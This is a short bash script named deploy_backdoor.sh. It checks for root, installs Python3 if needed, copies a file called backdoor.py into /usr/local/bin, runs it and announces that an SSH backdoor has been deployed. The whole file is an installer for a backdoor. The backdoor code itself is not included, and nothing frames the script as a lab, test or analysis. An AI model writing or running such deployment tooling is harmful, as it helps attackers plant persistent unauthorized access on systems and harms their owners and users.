#!/bin/bash
# deploy_backdoor.sh - Script to deploy the SSH backdoor

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

# Install Python and pip if not already installed
if ! command -v python3 &> /dev/null; then
    echo "Python3 could not be found. Installing Python3..."
    apt-get update
    apt-get install -y python3 python3-pip
fi

# Install the backdoor script
cp backdoor.py /usr/local/bin/backdoor.py
chmod +x /usr/local/bin/backdoor.py

# Run the backdoor setup
python3 /usr/local/bin/backdoor.py

echo "SSH backdoor deployed successfully."